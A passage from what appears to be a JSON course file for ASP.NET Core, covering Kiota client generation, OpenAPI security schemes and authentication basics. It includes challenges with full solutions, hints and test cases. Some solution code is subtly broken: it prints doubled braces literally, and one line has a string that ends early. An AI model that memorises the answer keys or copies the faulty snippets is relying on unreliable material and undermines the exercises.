              "content": "**Install CLI First**: Kiota is a .NET global tool. Install it with `dotnet tool install --global Microsoft.OpenApi.Kiota` before generating clients.\n\n**Multiple NuGet Packages**: Generated clients need THREE packages: `Microsoft.Kiota.Abstractions`, `Microsoft.Kiota.Http.HttpClientLibrary`, and `Microsoft.Kiota.Serialization.Json`. Missing any will cause compile errors.\n\n**BaseUrl is Required**: Always set `adapter.BaseUrl` before making requests. Without it, requests go nowhere or throw confusing errors.\n\n**Indexer vs Method**: Path parameters use indexer syntax `client.Products[id]`, NOT method syntax `client.Products(id)`. This is a common mistake that causes compile errors.\n\n**Regenerate After API Changes**: When the API spec changes, you must regenerate the client with `kiota update -o ./Client`. Forgetting this leads to runtime errors or missing endpoints. Consider adding regeneration to your CI/CD pipeline.\n\n**NSwag Alternative**: For simpler scenarios, NSwag also generates typed clients and has a GUI (NSwagStudio). Kiota is Microsoft's newer tool optimized for large APIs and multi-language support. Choose based on your needs.\n\n**Nullable Reference Types**: Kiota generates nullable types for optional fields. Always check for null: `product?.Name` instead of `product.Name`."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-19-04-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Demonstrate Kiota client usage patterns!\n\n1. Show the Kiota CLI command to generate a client:\n   - Language: CSharp\n   - Output: ./BookstoreClient\n   - Document: https://api.bookstore.com/openapi.json\n   - Client name: BookstoreApiClient\n   - Namespace: Bookstore.Client\n\n2. Write code that demonstrates using a generated client:\n   - Set up authentication provider and adapter\n   - Create the API client\n   - GET all books\n   - GET single book by ISBN\n   - POST create new book\n   - Search books with query parameters\n   - Handle 404 error gracefully\n\n3. Print the benefits of using Kiota over manual HttpClient",
              "starterCode": "using Microsoft.Kiota.Abstractions.Authentication;\nusing Microsoft.Kiota.Http.HttpClientLibrary;\n\nConsole.WriteLine(\"=== Kiota Client Generation ===\");\n\n// TODO: Print the Kiota CLI command to generate the client\n// kiota generate -l CSharp -o ./BookstoreClient ...\n\nConsole.WriteLine(\"\\n=== Using Generated Client ===\");\n\n// TODO: Create authentication provider (anonymous for demo)\n\n// TODO: Create HTTP client adapter with base URL\n\n// TODO: Create the typed API client\n// var client = new BookstoreApiClient(adapter);\n\n// Simulated client usage (comments showing what real code would look like)\nConsole.WriteLine(\"\\nTyped API Calls:\");\n\n// TODO: Show GET all books\n// var books = await client.Books.GetAsync();\n\n// TODO: Show GET book by ISBN\n// var book = await client.Books[\"978-0-13-468599-1\"].GetAsync();\n\n// TODO: Show POST create book\n// var newBook = await client.Books.PostAsync(new CreateBookRequest { ... });\n\n// TODO: Show search with query parameters\n// var results = await client.Books.GetAsync(config => {\n//     config.QueryParameters.Genre = \"Fiction\";\n// });\n\n// TODO: Show error handling for 404\n\n// TODO: Print benefits of Kiota\nConsole.WriteLine(\"\\n=== Benefits of Kiota ===\");",
              "solution": "using Microsoft.Kiota.Abstractions.Authentication;\nusing Microsoft.Kiota.Http.HttpClientLibrary;\n\nConsole.WriteLine(\"=== Kiota Client Generation ===\");\nConsole.WriteLine();\n\n// Print the Kiota CLI command\nConsole.WriteLine(\"Generate client with this command:\");\nConsole.WriteLine();\nConsole.WriteLine(\"kiota generate \\\\\");\nConsole.WriteLine(\"  -l CSharp \\\\\");\nConsole.WriteLine(\"  -o ./BookstoreClient \\\\\");\nConsole.WriteLine(\"  -d https://api.bookstore.com/openapi.json \\\\\");\nConsole.WriteLine(\"  -c BookstoreApiClient \\\\\");\nConsole.WriteLine(\"  -n Bookstore.Client\");\n\nConsole.WriteLine(\"\\n=== Using Generated Client ===\");\nConsole.WriteLine();\n\n// Create authentication provider\nConsole.WriteLine(\"// Set up authentication (anonymous for public API)\");\nConsole.WriteLine(\"var authProvider = new AnonymousAuthenticationProvider();\");\nvar authProvider = new AnonymousAuthenticationProvider();\n\n// Create HTTP client adapter\nConsole.WriteLine();\nConsole.WriteLine(\"// Create adapter with base URL\");\nConsole.WriteLine(\"var adapter = new HttpClientRequestAdapter(authProvider)\");\nConsole.WriteLine(\"{{\");\nConsole.WriteLine(\"    BaseUrl = \\\"https://api.bookstore.com\\\"\");\nConsole.WriteLine(\"}}\");\n\n// Create client\nConsole.WriteLine();\nConsole.WriteLine(\"// Create strongly-typed API client\");\nConsole.WriteLine(\"var client = new BookstoreApiClient(adapter);\");\n\nConsole.WriteLine(\"\\n=== Typed API Calls ===\");\nConsole.WriteLine();\n\n// GET all books\nConsole.WriteLine(\"// GET all books - fully typed!\");\nConsole.WriteLine(\"var books = await client.Books.GetAsync();\");\nConsole.WriteLine(\"foreach (var book in books)\");\nConsole.WriteLine(\"{{\");\nConsole.WriteLine(\"    Console.WriteLine($\\\"{{book.Title}} by {{book.Author}}\\\");\");\nConsole.WriteLine(\"}}\");\n\nConsole.WriteLine();\n\n// GET by ISBN\nConsole.WriteLine(\"// GET single book by ISBN\");\nConsole.WriteLine(\"var book = await client.Books[\\\"978-0-13-468599-1\\\"].GetAsync();\");\nConsole.WriteLine(\"Console.WriteLine($\\\"Found: {{book?.Title}}\\\");\");\n\nConsole.WriteLine();\n\n// POST create\nConsole.WriteLine(\"// POST create new book\");\nConsole.WriteLine(\"var newBook = await client.Books.PostAsync(new CreateBookRequest\");\nConsole.WriteLine(\"{{\");\nConsole.WriteLine(\"    Title = \\\"My New Book\\\",\");\nConsole.WriteLine(\"    Author = \\\"Jane Doe\\\",\");\nConsole.WriteLine(\"    Price = 29.99m\");\nConsole.WriteLine(\"}});\");\n\nConsole.WriteLine();\n\n// Search with query parameters\nConsole.WriteLine(\"// Search with typed query parameters\");\nConsole.WriteLine(\"var results = await client.Books.GetAsync(config =>\");\nConsole.WriteLine(\"{{\");\nConsole.WriteLine(\"    config.QueryParameters.Genre = \\\"Science Fiction\\\";\");\nConsole.WriteLine(\"    config.QueryParameters.MinPrice = 10m;\");\nConsole.WriteLine(\"    config.QueryParameters.MaxPrice = 50m;\");\nConsole.WriteLine(\"}});\");\n\nConsole.WriteLine();\n\n// Error handling\nConsole.WriteLine(\"// Handle 404 gracefully\");\nConsole.WriteLine(\"try\");\nConsole.WriteLine(\"{{\");\nConsole.WriteLine(\"    var book = await client.Books[\\\"invalid-isbn\\\"].GetAsync();\");\nConsole.WriteLine(\"}}\");\nConsole.WriteLine(\"catch (ApiException ex) when (ex.ResponseStatusCode == 404)\");\nConsole.WriteLine(\"{{\");\nConsole.WriteLine(\"    Console.WriteLine(\\\"Book not found!\\\");\");\nConsole.WriteLine(\"}}\");\n\nConsole.WriteLine(\"\\n=== Benefits of Kiota ===\");\nConsole.WriteLine();\nConsole.WriteLine(\"1. Strongly Typed: All requests and responses have proper types\");\nConsole.WriteLine(\"2. IntelliSense: IDE shows available endpoints and parameters\");\nConsole.WriteLine(\"3. Compile-Time Errors: Catch typos before runtime\");\nConsole.WriteLine(\"4. Auto-Updated: Regenerate when API changes\");\nConsole.WriteLine(\"5. Fluent API: client.Books[id].GetAsync() is intuitive\");\nConsole.WriteLine(\"6. Cross-Platform: Same patterns for C#, Python, TypeScript, etc.\");\nConsole.WriteLine(\"7. Lightweight: Minimal dependencies unlike other generators\");\nConsole.WriteLine();\nConsole.WriteLine(\"Compare to manual HttpClient:\");\nConsole.WriteLine(\"  BEFORE: await http.GetAsync(\\\"/books/\" + isbn);\");\nConsole.WriteLine(\"  AFTER:  await client.Books[isbn].GetAsync();\");",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Should show Kiota generate command",
                  "expectedOutput": "kiota generate",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Should demonstrate typed client usage",
                  "expectedOutput": "GetAsync",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Kiota CLI: kiota generate -l CSharp -o <output> -d <spec> -c <classname> -n <namespace>"
                },
                {
                  "level": 2,
                  "text": "AnonymousAuthenticationProvider is for public APIs without authentication."
                },
                {
                  "level": 3,
                  "text": "HttpClientRequestAdapter takes auth provider and needs BaseUrl set."
                },
                {
                  "level": 4,
                  "text": "Path parameters use indexer: client.Books[isbn] not client.Books(isbn)."
                },
                {
                  "level": 5,
                  "text": "Query params: GetAsync(config => { config.QueryParameters.Prop = value; })"
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Not installing required Kiota packages",
                  "consequence": "Missing types like HttpClientRequestAdapter, AnonymousAuthenticationProvider.",
                  "correction": "Install: Microsoft.Kiota.Abstractions, Microsoft.Kiota.Http.HttpClientLibrary, Microsoft.Kiota.Serialization.Json"
                },
                {
                  "mistake": "Forgetting to set BaseUrl on adapter",
                  "consequence": "Requests go to wrong URL or fail completely.",
                  "correction": "Always set adapter.BaseUrl = \"https://your-api.com\";"
                },
                {
                  "mistake": "Using () instead of [] for path parameters",
                  "consequence": "Compile error. Kiota uses indexer syntax for path params.",
                  "correction": "Use client.Books[id] not client.Books(id) for path parameters."
                },
                {
                  "mistake": "Not regenerating client after API changes",
                  "consequence": "Client is out of sync with API. Runtime errors or missing endpoints.",
                  "correction": "Run 'kiota update -o ./Client' after API changes or add to CI/CD pipeline."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        },
        {
          "id": "lesson-19-05",
          "title": "API Security Documentation",
          "moduleId": "module-19",
          "order": 5,
          "estimatedMinutes": 25,
          "difficulty": "advanced",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Concept",
              "content": "Imagine you're documenting the security at a private club:\n\nPOOR DOCUMENTATION:\n- 'Members only'\n- New visitors don't know how to become members\n- Security guards explain rules verbally each time\n- Inconsistent enforcement\n\nGOOD DOCUMENTATION:\n- Clear membership types (Basic, VIP, Staff)\n- Explicit entry requirements listed\n- ID verification process explained\n- Guest access rules documented\n\nAPI SECURITY DOCUMENTATION:\n\nAUTHENTICATION SCHEMES:\n1. Bearer Token (JWT)\n   - 'Show your membership card'\n   - Header: Authorization: Bearer <token>\n\n2. API Key\n   - 'Enter your access code'\n   - Header: X-API-Key: your-secret-key\n\n3. OAuth 2.0\n   - 'Login through our partner'\n   - Redirect flow for third-party apps\n\n4. Basic Auth\n   - 'Username and password'\n   - Header: Authorization: Basic base64(user:pass)\n\nOPENAPI SECURITY:\n- Define security schemes once\n- Apply to endpoints or globally\n- Document required scopes\n- Show in Swagger/Scalar UI\n\nBENEFITS:\n- Developers know how to authenticate\n- Auto-generated client handles auth\n- Security requirements are explicit\n- Testing tools can authenticate\n\nThink: 'Security documentation is your API's bouncer manual - everyone knows the rules before arriving!'"
            },
            {
              "type": "EXAMPLE",
              "title": "Code Example",
              "content": "This example demonstrates the concepts in action.",
              "code": "// ===== API SECURITY DOCUMENTATION =====\n\nusing Microsoft.AspNetCore.Authentication.JwtBearer;\nusing Microsoft.IdentityModel.Tokens;\nusing Microsoft.OpenApi.Models;\nusing System.Text;\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// Configure JWT Authentication\nbuilder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)\n    .AddJwtBearer(options =>\n    {\n        options.TokenValidationParameters = new TokenValidationParameters\n        {\n            ValidateIssuer = true,\n            ValidateAudience = true,\n            ValidateLifetime = true,\n            ValidateIssuerSigningKey = true,\n            ValidIssuer = \"https://myapi.com\",\n            ValidAudience = \"https://myapi.com\",\n            IssuerSigningKey = new SymmetricSecurityKey(\n                Encoding.UTF8.GetBytes(\"YourSuperSecretKeyHere32Chars!!\"))\n        };\n    });\n\nbuilder.Services.AddAuthorization();\n\n// Configure OpenAPI with security schemes\nbuilder.Services.AddOpenApi(options =>\n{\n    options.AddDocumentTransformer((document, context, cancellationToken) =>\n    {\n        // Define JWT Bearer security scheme\n        document.Components ??= new OpenApiComponents();\n        document.Components.SecuritySchemes = new Dictionary<string, OpenApiSecurityScheme>\n        {\n            [\"Bearer\"] = new OpenApiSecurityScheme\n            {\n                Type = SecuritySchemeType.Http,\n                Scheme = \"bearer\",\n                BearerFormat = \"JWT\",\n                Description = \"Enter your JWT token. Example: eyJhbGciOiJIUzI1NiIs...\"\n            },\n            [\"ApiKey\"] = new OpenApiSecurityScheme\n            {\n                Type = SecuritySchemeType.ApiKey,\n                In = ParameterLocation.Header,\n                Name = \"X-API-Key\",\n                Description = \"API key for server-to-server communication\"\n            }\n        };\n\n        // Apply Bearer auth globally (can be overridden per-endpoint)\n        document.SecurityRequirements = new List<OpenApiSecurityRequirement>\n        {\n            new OpenApiSecurityRequirement\n            {\n                [new OpenApiSecurityScheme\n                {\n                    Reference = new OpenApiReference\n                    {\n                        Type = ReferenceType.SecurityScheme,\n                        Id = \"Bearer\"\n                    }\n                }] = Array.Empty<string>()\n            }\n        };\n\n        return Task.CompletedTask;\n    });\n});\n\nvar app = builder.Build();\n\napp.UseAuthentication();\napp.UseAuthorization();\n\napp.MapOpenApi();\n\n// ===== PUBLIC ENDPOINTS (No Auth) =====\n\napp.MapGet(\"/health\", () => new { Status = \"Healthy\", Timestamp = DateTime.UtcNow })\n    .WithName(\"HealthCheck\")\n    .WithTags(\"System\")\n    .WithDescription(\"Public health check endpoint - no authentication required\")\n    .AllowAnonymous();  // Explicitly public\n\napp.MapPost(\"/auth/login\", (LoginRequest request) =>\n{\n    // In real app: validate credentials, generate JWT\n    return Results.Ok(new\n    {\n        Token = \"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...\",\n        ExpiresIn = 3600\n    });\n})\n    .WithName(\"Login\")\n    .WithTags(\"Authentication\")\n    .WithDescription(\"Authenticate with username/password to receive JWT token\")\n    .AllowAnonymous();\n\n// ===== PROTECTED ENDPOINTS =====\n\napp.MapGet(\"/products\", () =>\n{\n    return new[]\n    {\n        new Product(1, \"Laptop\", 999.99m),\n        new Product(2, \"Mouse\", 29.99m)\n    };\n})\n    .WithName(\"GetProducts\")\n    .WithTags(\"Products\")\n    .WithDescription(\"Returns all products. Requires Bearer token authentication.\")\n    .RequireAuthorization();  // Requires valid JWT\n\napp.MapGet(\"/admin/users\", () =>\n{\n    return new[] { new User(1, \"admin@example.com\", \"Admin\") };\n})\n    .WithName(\"GetUsers\")\n    .WithTags(\"Admin\")\n    .WithDescription(\"Admin only endpoint. Requires Bearer token with 'admin' role.\")\n    .RequireAuthorization(\"AdminPolicy\");  // Requires specific policy\n\nConsole.WriteLine(\"Security configured:\");\nConsole.WriteLine(\"  Public: /health, /auth/login\");\nConsole.WriteLine(\"  Protected: /products (Bearer token)\");\nConsole.WriteLine(\"  Admin: /admin/users (Bearer + admin role)\");\n\napp.Run();\n\n// ===== MODELS =====\n\npublic record LoginRequest(string Username, string Password);\npublic record Product(int Id, string Name, decimal Price);\npublic record User(int Id, string Email, string Role);",
              "language": "csharp"
            },
            {
              "type": "THEORY",
              "title": "Syntax Breakdown",
              "content": "## Breaking Down the Syntax\n\n**`SecuritySchemeType.Http`**: Standard HTTP authentication (Bearer, Basic). Most common for JWT tokens.\n\n**`SecuritySchemeType.ApiKey`**: API key in header, query, or cookie. Good for server-to-server calls.\n\n**`SecuritySchemeType.OAuth2`**: OAuth 2.0 flows (authorization code, client credentials). For third-party integrations.\n\n**`BearerFormat = \"JWT\"`**: Hints that the bearer token is a JWT. Helps documentation tools and developers.\n\n**`ParameterLocation.Header`**: Where the API key is sent. Options: Header, Query, Cookie.\n\n**`document.Components.SecuritySchemes`**: Defines available auth methods. Referenced by name in security requirements.\n\n**`document.SecurityRequirements`**: Global security applied to all endpoints. Individual endpoints can override.\n\n**`.AllowAnonymous()`**: Explicitly marks endpoint as public. Overrides global security requirements.\n\n**`.RequireAuthorization()`**: Endpoint requires authentication. User must present valid credentials.\n\n**`.RequireAuthorization(\"PolicyName\")`**: Requires specific authorization policy. For role-based or claims-based access.\n\n**`AddDocumentTransformer`**: .NET 9 way to customize OpenAPI document. Add security schemes, info, servers, etc."
            },
            {
              "type": "WARNING",
              "title": "Common Pitfalls",
              "content": "**Middleware Order Matters**: `app.UseAuthentication()` MUST come before `app.UseAuthorization()`, and both MUST come before `app.MapOpenApi()` and your endpoints. Wrong order = security doesn't work.\n\n**AllowAnonymous is Explicit**: Without `.AllowAnonymous()`, public endpoints like health checks or login may require authentication if you set global security. Always be explicit about public endpoints.\n\n**Document 401 AND 403**: Protected endpoints should declare both `.Produces(StatusCodes.Status401Unauthorized)` (not authenticated) and `.Produces(StatusCodes.Status403Forbidden)` (authenticated but not authorized). Different errors mean different things.\n\n**Never Hardcode Secrets**: JWT signing keys, API keys, and credentials should NEVER be in source code. Use `IConfiguration`, environment variables, Azure Key Vault, or AWS Secrets Manager.\n\n**Security Scheme Reference**: When referencing a security scheme in requirements, use `Reference = new OpenApiReference { Type = ReferenceType.SecurityScheme, Id = \"SchemeName\" }`. Missing this reference causes the scheme to not apply.\n\n**Testing Protected Endpoints**: Scalar and Swagger UI have 'Authorize' buttons that let you enter tokens for testing. Configure `.WithPreferredScheme(\"Bearer\")` in Scalar to hint which auth method to use.\n\n**HTTPS in Production**: All security schemes assume HTTPS in production. Bearer tokens and API keys sent over HTTP are visible to attackers. Always use HTTPS."
            }
          ],
          "challenges": [
            {
              "type": "FREE_CODING",
              "id": "lesson-19-05-challenge-01",
              "title": "Practice Challenge",
              "description": "Apply what you've learned in this interactive coding challenge.",
              "instructions": "Create a fully documented API with security!\n\n1. Configure OpenAPI with these security schemes:\n   - Bearer (JWT token)\n   - ApiKey (header: X-API-Key)\n\n2. Create these endpoints with proper security documentation:\n   \n   PUBLIC (AllowAnonymous):\n   - GET /health - Health check\n   - POST /auth/login - Get JWT token\n   \n   PROTECTED (RequireAuthorization):\n   - GET /orders - List user's orders\n   - POST /orders - Create new order\n   \n   ADMIN (RequireAuthorization with policy):\n   - GET /admin/orders - List ALL orders\n   - DELETE /admin/orders/{id} - Delete any order\n\n3. Each endpoint needs proper tags, descriptions, and response types\n\n4. Print a summary of the security configuration",
              "starterCode": "using Microsoft.OpenApi.Models;\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// TODO: Add authentication and authorization services\n\n// TODO: Configure OpenAPI with security schemes\n// Use AddDocumentTransformer to add:\n// - Bearer scheme (JWT)\n// - ApiKey scheme (X-API-Key header)\n\nvar app = builder.Build();\n\n// TODO: Add authentication/authorization middleware\n\napp.MapOpenApi();\n\n// ===== PUBLIC ENDPOINTS =====\n\n// TODO: GET /health - AllowAnonymous\n\n// TODO: POST /auth/login - AllowAnonymous, returns token\n\n// ===== PROTECTED ENDPOINTS =====\n\n// TODO: GET /orders - RequireAuthorization\n// Returns user's orders\n\n// TODO: POST /orders - RequireAuthorization\n// Creates new order\n\n// ===== ADMIN ENDPOINTS =====\n\n// TODO: GET /admin/orders - RequireAuthorization(\"Admin\")\n// Returns ALL orders (admin only)\n\n// TODO: DELETE /admin/orders/{id} - RequireAuthorization(\"Admin\")\n// Deletes order (admin only)\n\n// TODO: Print security summary\n\napp.Run();\n\n// TODO: Define models (LoginRequest, Order, CreateOrderRequest)",
              "solution": "using Microsoft.AspNetCore.Authentication.JwtBearer;\nusing Microsoft.OpenApi.Models;\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// Add authentication and authorization\nbuilder.Services.AddAuthentication(JwtBearerDefaults.AuthenticationScheme)\n    .AddJwtBearer();\nbuilder.Services.AddAuthorization(options =>\n{\n    options.AddPolicy(\"Admin\", policy => policy.RequireRole(\"Admin\"));\n});\n\n// Configure OpenAPI with security schemes\nbuilder.Services.AddOpenApi(options =>\n{\n    options.AddDocumentTransformer((document, context, cancellationToken) =>\n    {\n        document.Components ??= new OpenApiComponents();\n        document.Components.SecuritySchemes = new Dictionary<string, OpenApiSecurityScheme>\n        {\n            [\"Bearer\"] = new OpenApiSecurityScheme\n            {\n                Type = SecuritySchemeType.Http,\n                Scheme = \"bearer\",\n                BearerFormat = \"JWT\",\n                Description = \"JWT token from /auth/login endpoint\"\n            },\n            [\"ApiKey\"] = new OpenApiSecurityScheme\n            {\n                Type = SecuritySchemeType.ApiKey,\n                In = ParameterLocation.Header,\n                Name = \"X-API-Key\",\n                Description = \"API key for service accounts\"\n            }\n        };\n        return Task.CompletedTask;\n    });\n});\n\nvar app = builder.Build();\n\napp.UseAuthentication();\napp.UseAuthorization();\n\napp.MapOpenApi();\n\n// ===== PUBLIC ENDPOINTS =====\n\napp.MapGet(\"/health\", () => new { Status = \"Healthy\", Time = DateTime.UtcNow })\n    .WithName(\"HealthCheck\")\n    .WithTags(\"System\")\n    .WithDescription(\"Public health check - no authentication required\")\n    .Produces<object>(StatusCodes.Status200OK)\n    .AllowAnonymous();\n\napp.MapPost(\"/auth/login\", (LoginRequest request) =>\n{\n    // Validate and return token (simplified)\n    return Results.Ok(new { Token = \"jwt.token.here\", ExpiresIn = 3600 });\n})\n    .WithName(\"Login\")\n    .WithTags(\"Authentication\")\n    .WithDescription(\"Authenticate to receive JWT token\")\n    .Accepts<LoginRequest>(\"application/json\")\n    .Produces<object>(StatusCodes.Status200OK)\n    .Produces(StatusCodes.Status401Unauthorized)\n    .AllowAnonymous();\n\n// ===== PROTECTED ENDPOINTS =====\n\nvar orders = new List<Order>\n{\n    new(1, \"user@example.com\", 99.99m, \"Pending\"),\n    new(2, \"user@example.com\", 149.99m, \"Shipped\")\n};\n\napp.MapGet(\"/orders\", () => orders)\n    .WithName(\"GetUserOrders\")\n    .WithTags(\"Orders\")\n    .WithDescription(\"Get current user's orders. Requires Bearer token.\")\n    .Produces<List<Order>>(StatusCodes.Status200OK)\n    .Produces(StatusCodes.Status401Unauthorized)\n    .RequireAuthorization();\n\napp.MapPost(\"/orders\", (CreateOrderRequest request) =>\n{\n    var order = new Order(orders.Count + 1, \"user@example.com\", request.Amount, \"Pending\");\n    orders.Add(order);\n    return Results.Created($\"/orders/{order.Id}\", order);\n})\n    .WithName(\"CreateOrder\")\n    .WithTags(\"Orders\")\n    .WithDescription(\"Create new order. Requires Bearer token.\")\n    .Accepts<CreateOrderRequest>(\"application/json\")\n    .Produces<Order>(StatusCodes.Status201Created)\n    .Produces(StatusCodes.Status401Unauthorized)\n    .RequireAuthorization();\n\n// ===== ADMIN ENDPOINTS =====\n\napp.MapGet(\"/admin/orders\", () => orders)\n    .WithName(\"GetAllOrders\")\n    .WithTags(\"Admin\")\n    .WithDescription(\"Get ALL orders. Admin role required.\")\n    .Produces<List<Order>>(StatusCodes.Status200OK)\n    .Produces(StatusCodes.Status401Unauthorized)\n    .Produces(StatusCodes.Status403Forbidden)\n    .RequireAuthorization(\"Admin\");\n\napp.MapDelete(\"/admin/orders/{id}\", (int id) =>\n{\n    var order = orders.FirstOrDefault(o => o.Id == id);\n    if (order is null) return Results.NotFound();\n    orders.Remove(order);\n    return Results.NoContent();\n})\n    .WithName(\"DeleteOrder\")\n    .WithTags(\"Admin\")\n    .WithDescription(\"Delete any order. Admin role required.\")\n    .Produces(StatusCodes.Status204NoContent)\n    .Produces(StatusCodes.Status404NotFound)\n    .Produces(StatusCodes.Status401Unauthorized)\n    .Produces(StatusCodes.Status403Forbidden)\n    .RequireAuthorization(\"Admin\");\n\n// Print security summary\nConsole.WriteLine(\"=== API Security Configuration ===\");\nConsole.WriteLine();\nConsole.WriteLine(\"Security Schemes:\");\nConsole.WriteLine(\"  - Bearer: JWT token in Authorization header\");\nConsole.WriteLine(\"  - ApiKey: X-API-Key header\");\nConsole.WriteLine();\nConsole.WriteLine(\"Endpoint Security:\");\nConsole.WriteLine(\"  PUBLIC (no auth):\");\nConsole.WriteLine(\"    GET  /health\");\nConsole.WriteLine(\"    POST /auth/login\");\nConsole.WriteLine();\nConsole.WriteLine(\"  PROTECTED (Bearer token):\");\nConsole.WriteLine(\"    GET  /orders\");\nConsole.WriteLine(\"    POST /orders\");\nConsole.WriteLine();\nConsole.WriteLine(\"  ADMIN (Bearer + Admin role):\");\nConsole.WriteLine(\"    GET    /admin/orders\");\nConsole.WriteLine(\"    DELETE /admin/orders/{id}\");\n\napp.Run();\n\npublic record LoginRequest(string Username, string Password);\npublic record Order(int Id, string UserEmail, decimal Amount, string Status);\npublic record CreateOrderRequest(decimal Amount);",
              "language": "csharp",
              "testCases": [
                {
                  "id": "test-1",
                  "description": "Should configure security schemes",
                  "expectedOutput": "SecuritySchemes",
                  "isVisible": true
                },
                {
                  "id": "test-2",
                  "description": "Should have protected endpoints",
                  "expectedOutput": "RequireAuthorization",
                  "isVisible": true
                }
              ],
              "hints": [
                {
                  "level": 1,
                  "text": "Use AddDocumentTransformer to add security schemes to the OpenAPI document."
                },
                {
                  "level": 2,
                  "text": "document.Components.SecuritySchemes is a Dictionary<string, OpenApiSecurityScheme>."
                },
                {
                  "level": 3,
                  "text": ".AllowAnonymous() makes endpoint public, .RequireAuthorization() makes it protected."
                },
                {
                  "level": 4,
                  "text": ".RequireAuthorization(\"Admin\") requires the 'Admin' policy defined in AddAuthorization."
                },
                {
                  "level": 5,
                  "text": "Document 401 Unauthorized and 403 Forbidden responses for protected endpoints."
                }
              ],
              "commonMistakes": [
                {
                  "mistake": "Forgetting UseAuthentication() and UseAuthorization() middleware",
                  "consequence": "RequireAuthorization has no effect. All endpoints are accessible.",
                  "correction": "Add app.UseAuthentication(); app.UseAuthorization(); before mapping endpoints."
                },
                {
                  "mistake": "Not documenting 401/403 response codes",
                  "consequence": "API consumers don't know authentication is required until they get errors.",
                  "correction": "Add .Produces(StatusCodes.Status401Unauthorized) and 403 for admin endpoints."
                },
                {
                  "mistake": "Using AllowAnonymous on sensitive endpoints",
                  "consequence": "Security bypass! Anyone can access protected resources.",
                  "correction": "Only use AllowAnonymous on truly public endpoints like health checks and login."
                },
                {
                  "mistake": "Hardcoding secrets in source code",
                  "consequence": "Secrets exposed in version control. Security breach risk.",
                  "correction": "Use configuration, environment variables, or secret managers for JWT keys."
                }
              ],
              "difficulty": "advanced"
            }
          ]
        }
      ]
    },
    {
      "id": "module-20",
      "title": "Authentication Fundamentals",
      "description": "Secure your applications with ASP.NET Core Identity, cookies, and JWT tokens. Learn the complete authentication story for web applications and APIs.",
      "difficulty": "intermediate",
      "estimatedHours": 4,
      "lessons": [
        {
          "id": "lesson-20-01",
          "title": "Authentication vs Authorization (The Security Guard)",
          "moduleId": "module-20",
          "order": 1,
          "estimatedMinutes": 25,
          "difficulty": "intermediate",
          "contentSections": [
            {
              "type": "ANALOGY",
              "title": "Understanding the Difference",
              "content": "Imagine you're entering a corporate office building. At the front entrance, there's a security guard who checks your ID badge. This is AUTHENTICATION - the guard is verifying WHO you are. \"Are you really John Smith from the Marketing department?\" They check your photo, your badge number, maybe even scan it against their system. If your credentials check out, you're allowed into the building.\n\nBut getting through the front door doesn't mean you can go anywhere! Once inside, different floors and rooms have different access levels. The CEO's office? Locked. The server room? Requires a special keycard. The break room? Open to everyone. This is AUTHORIZATION - determining WHAT you're allowed to do based on who you are.\n\nIn web applications, the same two-step process applies:\n\nSTEP 1 - AUTHENTICATION (\"Who are you?\")\n- User provides credentials (username/password, OAuth token, API key)\n- System verifies the credentials are valid\n- If valid, user gets an identity (like an ID badge)\n- If invalid, access denied - can't even enter the building!\n\nSTEP 2 - AUTHORIZATION (\"What can you do?\")\n- System checks the user's identity against access rules\n- Different users have different permissions\n- Admin can delete products, regular users can only view\n- Even authenticated users may be forbidden from certain actions\n\nThe key insight: Authentication ALWAYS comes first. You can't check what someone is allowed to do until you know who they are. That's why in ASP.NET Core, UseAuthentication() middleware must come before UseAuthorization()."
            },
            {
              "type": "EXAMPLE",
              "title": "Auth in ASP.NET Core",
              "content": "This example shows the complete authentication and authorization setup in an ASP.NET Core application.",
              "code": "// ===== COMPLETE AUTH SETUP IN PROGRAM.CS =====\n\nusing Microsoft.AspNetCore.Authentication.Cookies;\nusing Microsoft.AspNetCore.Authentication.JwtBearer;\nusing Microsoft.IdentityModel.Tokens;\nusing System.Text;\n\nvar builder = WebApplication.CreateBuilder(args);\n\n// ===== STEP 1: CONFIGURE AUTHENTICATION =====\n// Define HOW users prove their identity\n\nbuilder.Services.AddAuthentication(options =>\n{\n    // Default scheme for web app (cookies)\n    options.DefaultScheme = CookieAuthenticationDefaults.AuthenticationScheme;\n    // Challenge scheme for APIs (JWT)\n    options.DefaultChallengeScheme = JwtBearerDefaults.AuthenticationScheme;\n})\n// Cookie authentication for web browsers\n.AddCookie(CookieAuthenticationDefaults.AuthenticationScheme, options =>\n{\n    options.LoginPath = \"/login\";\n    options.LogoutPath = \"/logout\";\n    options.AccessDeniedPath = \"/access-denied\";\n    options.ExpireTimeSpan = TimeSpan.FromHours(8);\n    options.SlidingExpiration = true;\n    options.Cookie.HttpOnly = true;           // Prevent XSS access\n    options.Cookie.SecurePolicy = CookieSecurePolicy.Always; // HTTPS only\n    options.Cookie.SameSite = SameSiteMode.Strict;           // CSRF protection\n})\n// JWT authentication for APIs\n.AddJwtBearer(JwtBearerDefaults.AuthenticationScheme, options =>\n{\n    options.TokenValidationParameters = new TokenValidationParameters\n    {\n        ValidateIssuer = true,\n        ValidateAudience = true,\n        ValidateLifetime = true,\n        ValidateIssuerSigningKey = true,\n        ValidIssuer = builder.Configuration[\"Jwt:Issuer\"],\n        ValidAudience = builder.Configuration[\"Jwt:Audience\"],\n        IssuerSigningKey = new SymmetricSecurityKey(\n            Encoding.UTF8.GetBytes(builder.Configuration[\"Jwt:Key\"]!)\n        ),\n        ClockSkew = TimeSpan.Zero  // No tolerance for expired tokens\n    };\n});\n\n// ===== STEP 2: CONFIGURE AUTHORIZATION =====\n// Define WHAT authenticated users can do\n\nbuilder.Services.AddAuthorization(options =>\n{\n    // Role-based policies\n    options.AddPolicy(\"AdminOnly\", policy => \n        policy.RequireRole(\"Admin\"));\n    \n    options.AddPolicy(\"ManagerOrAdmin\", policy => \n        policy.RequireRole(\"Manager\", \"Admin\"));\n    \n    // 